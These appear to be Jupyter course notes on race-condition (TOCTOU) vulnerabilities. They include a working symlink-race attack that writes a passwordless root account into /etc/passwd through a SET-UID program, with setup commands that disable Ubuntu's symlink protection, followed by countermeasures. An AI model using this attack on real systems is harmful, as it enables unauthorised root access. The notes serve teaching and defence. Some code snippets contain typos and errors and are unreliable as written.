{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Race Condition Vulnerabilities\n",
    "\n",
    "\n",
    "### Three Examples \n",
    "#### Example 1\n",
    "The following PHP code introduces the example of a race condition: in banking system, when two withdraw of \\$90 requests take place in a short interval, instead of accepting one and rejecting the other, the system could potentially withdraw \\$180, which is undefined behavior. \n",
    "\n",
    "```php\n",
    "function withdraw($amount)\n",
    "{\n",
    "    $balance = getBalance();\n",
    "    if ($amount <= $balance) {\n",
    "        $balance = $balance - $amount;\n",
    "        echo \"You have withdrawn: $amount\";\n",
    "        saveBalance($balance);\n",
    "    }\n",
    "    else {\n",
    "        echo \"Insufficient Fund.\"; \n",
    "    }\n",
    "}\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "__Time of Check Time of Use__: A special type of race condition in software that occurs when checking a condition before using a resource. The condition could change between time of use and time of check. <br>\n",
    "__Dirty COW__: allows attacker to modify any protected file, as only as file is readable to the attacker. It is able to be exploited for privilege escalation. Affects Linux and Android."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Example 2\n",
    "The property of a SET-UID program is that when it is executed by a normal user, its _effective UID_ is root, but real UID is not root. The following program is SET-UID program and wants to write to /tmp, which is globally writable. The SET-UID program has root privilege to write to any files, but to enforce that only the real user can write to the file, the program checks if the real UID is correct. This is done through `access()` call. The program thus checks if the real user has the privilege to write to the file `/tmp/x`. \n",
    "```c\n",
    "if (!access(\"/tmp/x\", W_OK)) \n",
    "{\n",
    "    f = open(\"/tmp/x\", O_WRITE);\n",
    "    write_to_file(f); \n",
    "}\n",
    "else \n",
    "{\n",
    "    fprintf(stderr, \"Permission denied\\n\");\n",
    "}\n",
    "```\n",
    "`open()` system call checks the effective UID of the program, whereas `access()` checks the real user ID for the program. The code on the system call `open()` from execution. However, there is a window between the time when file is checked and time when file is opened. <br>\n",
    "To make use of the vulnerability in this 'blink of time', we can think of using __symbolic link__. Suppose that we want to modify the file `/etc/passwd`, but we can only write to `/tmp/x`. Now: \n",
    "* Before running the privileged program, we create a regular file X inside the `/tmp` directory. \n",
    "* This will pass `access()` check since it is our own file. \n",
    "* Right after `access()` can before program reaches `open()`, we quickly change `/tmp/x` to a symbolic link to the `/etc/passwd`. \n",
    "* When `open()` is invoked, it will open the passwd file, and since it only checks euid, now the program has write access to the file.\n",
    "Since the modern processor runs instructions in less than miliseconds, it is very unlikely to successfully execute the linking in between. However, with large number of tries, it is possible to do the work right in the interval. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "To actually perform an attack, we need:\n",
    "* The vulnerable program to run in a loop\n",
    "* Run the attack program at the same time.\n",
    "The __attacker__ runs the following instructions relentlessly: \n",
    "* __A1__: Make the `/tmp/x` point to a file owned by us. (simply create this file)\n",
    "* __A2__: Make `/tmp/x` point to `passwd` (by symbolic linking) \n",
    "The __vulnerable__ program runs the following instructions relentlessly:\n",
    "* __V1__: check users permission on `/tmp/x`\n",
    "* __V2__: open the `/tmp/x` file for write"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "As long as the final sequence of execution is: $ \\textbf{A}_1 \\rightarrow \\textbf{V}_1 \\rightarrow \\textbf{A}_2\\rightarrow \\textbf{V}_2$, we can achieve the goal."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Example 3\n",
    "In the following program, another SET-UID, examines if a file exists, if not, it will create it and write to it. \n",
    "```c\n",
    "file = \"/tmp/x\";\n",
    "fileExist = check_file_existance(file);\n",
    "if (fileExist == FALSE) \n",
    "{\n",
    "    f = open(file, O_CREAT);\n",
    "    //write \n",
    "    ...\n",
    "}\n",
    "```\n",
    "So if between the check existance and the `open()`, we somehow make the name a symbolic link to `\\etc\\passwd`, we can again have write access to the passwd file. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Experiment Set up \n",
    "The following vulnerable program has the same problem as the `access` and `open` problem introduced before <br>\n",
    "```c\n",
    "#include <stdio.h>\n",
    "#include <unistd.h>\n",
    "\n",
    "int main() \n",
    "{\n",
    "    char *fn = \"/tmp/XYZ\";\n",
    "    char buffer[60];\n",
    "    FILE *fp;\n",
    "    \n",
    "    scanf(\"%50s\", buffer);\n",
    "    if (!access(fn, W_OK)) \n",
    "    {\n",
    "        fp = fopen(fn, \"a+\");\n",
    "        fwrite(\"\\n\", sizeof(char), 1, fp);\n",
    "        fwrite(buffer, sizeof(char), strlen(buffer), fp); \n",
    "        \n",
    "    }\n",
    "                           \n",
    "    \n",
    "}\n",
    "```\n",
    "Set it as SET-UID, as:\n",
    "```\n",
    "gcc vulp.c -o vulp\n",
    "sudo chown root vulp\n",
    "sudo chmod 4755 vulp\n",
    "```\n",
    "Then we need to turn off the Ubuntu countermeasure that does not allow symbolic link to a world-writable directory. \n",
    "```\n",
    "sudo sysctl -w kernel.yama.protected_sticky_symlinks=0 \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Launching Attack\n",
    "\n",
    "#### Phase 1: Choose the target \n",
    "The target for this attack is the `/etc/passwd` file, which contains users and their passwords. The goal is to create a new user with root privilege. For the root user, the third field is zero (there are seven fields total). The power of the root account comes from the UID field, which, here is zero. If we want to create an account with root privilege, we need to set the account uid to be 0. <br> \n",
    "```\n",
    "root:x:0:0:root:/root:/bin/bash\n",
    "```\n",
    "The second field is the password field. `x` in this field means that the password is stored in `/etc/shadow`. To faciliate, we can simply provide a password here, which is a one way hash here. To get such a value, we can:\n",
    "* Add a new user in our own system using `adduser` command, and then get one-way hash value of our password from shadow file. \n",
    "* Or simply use the magic value for password-less account. `U6aMy0wojraho`. \n",
    "If we succeed, we can make a `test` account that has root privilege but requires no password. <br>\n",
    "```\n",
    "test:U6aMy0wojraho:0:0:test:/root:/bin/bash\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Phase 2: Run Race programs \n",
    "The vulnerable program should be run in an infinite loop: \n",
    "```sh\n",
    "#!/bin/sh\n",
    "\n",
    "while : \n",
    "do \n",
    "    ./vulp < passwd_input # password_input is the string to insert in passwd\n",
    "done \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The attacking program has the following steps: \n",
    "* Create a symlink to a file owned by us. (to pass the access() check)\n",
    "* Sleep for 10000 microseconds to let the vulnerable process run.\n",
    "* Unlink the symlink\n",
    "* Create a symlink to /etc/passwd (this is the file we want to open)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```c\n",
    "#include <unistd.h>\n",
    "\n",
    "int main() \n",
    "{\n",
    "    while (1) \n",
    "    {\n",
    "        unlink(\"/tmp/XYZ\");\n",
    "        symlink(\"myfile\", \"/tmp/XYZ\");\n",
    "        usleep(10000);\n",
    "    \n",
    "        unlink(\"/tmp/XYZ\");\n",
    "        symlink(\"/etc/passwd\", \"/tmp/XYZ\");\n",
    "        usleep(10000);\n",
    "    }\n",
    "    return 0;\n",
    "}\n",
    "```\n",
    "If we successfully have the sequence execution of: __access__ -> __link to passwd__ -> __open__, we can create the new user."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Phase 3: Monitoring \n",
    "We need to monitor the passwd file to see if it has been written, which is done automatically with an upgrade from the previous script.\n",
    "![check](./image_files/check.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "When we begin the attack, we first run the attack program, then the vulnerable program, and wait for the script to stop. In the early stage, the terminal will throw out PERMISSION DENIED, due to access() failure, but evenutally the script will terminate and we will have write to the passwd file. Once passwd file is written \n",
    "```\n",
    "su test\n",
    "```\n",
    "will give us a root shell with no password. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### CounterMeasures: \n",
    "Questions:\n",
    "* How do we eliminate the window between check and use?\n",
    "* how do we prevent others from doing anything inside the window?\n",
    "* How do we make it difficult for attackers to win the \"race\"? \n",
    "* How do we prevent attackers from causing damages after they have won the \"race\"? \n",
    "\n",
    "#### Atomic Operations \n",
    "Completely eliminate the check and use window by making the whole operation atomic. <br>\n",
    "\n",
    "__File existence case:__ \n",
    "To ensure the atomicity of existence check and open, one can specify the flag `O_EXCL`. When using `open` with both `O_CREAT` and `O_EXCL`, when the file already exists, the specified file will not be opened. When these two flags are used, symbolic links are also not followed. If the filename is a symlink, `open` will fail regardless of outcome. In fact, the whole if condition in previous vulnerable code can be removed. \n",
    "```c\n",
    "f = open(file, O_CTEAT | O_EXCL);\n",
    "```\n",
    "__File Writable Case__:\n",
    "Moreoever, to solve the write privilege check and write race condition, we can combine the functionality with open() with following:\n",
    "```c\n",
    "f = open(file, O_WRITE | O_REAL_USER_ID);\n",
    "```\n",
    "But this is not yet existant. So the problem of acess() and open() is yet to be solved. \n",
    "\n",
    "#### Repeating Check and Use \n",
    "Add more race conditions to the code, such that the attacker needs to _win them all_ to succeed. In the following example:\n",
    "* check-and-use is done three times \n",
    "* check if the inodes are the same \n",
    "* for a successful attack, `/tmp/XYZ` needs to be changed 5 times: one change for each window\n",
    "* The chance of winning the race 5 times is much lower than once.\n",
    "\n",
    "```c\n",
    "#include <sys/types.h>\n",
    "#include <sys/stat.h>\n",
    "#include <fcntl.h>\n",
    "#include <stdio.h>\n",
    "\n",
    "int main()\n",
    "{\n",
    "    struct stat, stat1, stat2, stat3; \n",
    "    int fd1, fd2, fd3;\n",
    "    \n",
    "    if (access(\"/tmp/XYZ\", O_RDWR)) \n",
    "    {\n",
    "        fprintf(stderr, \"Permission Denied\");\n",
    "        return -1;           \n",
    "    }\n",
    "    // ----window 1---------\n",
    "    else fd1 = open(\"/tmp/XYZ\", O_RDWR);\n",
    "    //-----window 2---------\n",
    "    if (access(\"/tmp/XYZ\", O_RDWR)) \n",
    "    {\n",
    "        fprintf(stderr, \"Permission Denied\");\n",
    "        return -1;           \n",
    "    }\n",
    "    //-----window 3--------------\n",
    "    else fd2 = open(\"/tmp/XYZ\", O_RDWR);  \n",
    "    //-----window 4---------------\n",
    "    if (access(\"/tmp/XYZ\", O_RDWR)) \n",
    "    {\n",
    "        fprintf(stderr, \"Permission Denied\");\n",
    "        return -1;            \n",
    "    }\n",
    "    //------window 5----------------\n",
    "    else fd3 = open(\"/tmp/XYZ\", O_RDWR);  \n",
    " \n",
    "    //check whether fd1, fd2, fd3 are the same inode\n",
    "    fstat(fd1, &stat1);\n",
    "    fstat(fd2, &stat2);\n",
    "    fstat(fd3, &stat3);\n",
    " \n",
    "    if (stat1.st_ino == stat2.st_ino && stat2.st_ino == stat3.st_ino \n",
    "        && stat3.st_ino = stat1.st_ino ) \n",
    "    {\n",
    "        write_to_file(fd1);\n",
    "    }\n",
    "    else {\n",
    "        fprintf(stderr, \"Race condition detected\\n\");\n",
    "        return -1;\n",
    "    }\n",
    "    return 0; \n",
    "}\n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Sticky Symlink Protection \n",
    "In Ubuntu, the built-in protection mechanism can prevent programs from following symbolic links under certain conditions, for example, for world-writable __sticky directories__ such as \\tmp, symbolic links are not followed by programs. This prevents damage even if the race condition has been exploited. Mnual enable is:\n",
    "```\n",
    "sudo sysctl -w kernel.yama.protected_sticky_symlinks=1\n",
    "```\n",
    "In Linux filesytem, a directory has a special bit called __sticky bit__. When this bit is set, a file inside the directory can only be renamed or deleted by the file's owner, the directory's owner, or root. If not set, any user with write and execute permissions for the directory can rename or delete files inside the directory, regardless of who owns the files. Since /tmp directory is world-writable, to prevent normal users from renaming or deleting other users' files inside, its sticky bit is set. <br> \n",
    "When a sticky symlink protection is enabled, symlink links inside a sticky world-writable directory can only be followed when the owner of the symlink matches either the follower or the directory owner. <br> "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Principles of least privilege\n",
    "Instead of extra check, simply disable the program's privilege for certain tasks.\n",
    "```c\n",
    "uid_t real_uid = getuid();\n",
    "uid_t eff_uid = geteuid();\n",
    "\n",
    "seteuid(real_uid);  //disable root privilege\n",
    "\n",
    "f = open(\"/tmp/X\", O_WRITE); //now safely without check\n",
    "//...\n",
    "//if needed, restore\n",
    "seteuid(eff_uid); \n",
    "\n",
    "```"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.5.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
